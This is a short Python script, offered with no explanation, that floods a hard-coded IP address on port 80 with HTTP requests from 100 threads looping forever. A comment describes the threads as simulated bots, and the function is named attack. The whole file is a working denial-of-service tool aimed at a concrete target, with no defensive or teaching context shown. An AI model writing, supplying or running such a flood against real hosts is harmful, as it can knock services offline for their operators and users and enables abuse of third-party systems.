import threading
import socket

target_ip = "150.1.7.106"
target_port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
        except:
            pass
        s.close()

threads = []
for i in range(100):  # Simulating 100 bots
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
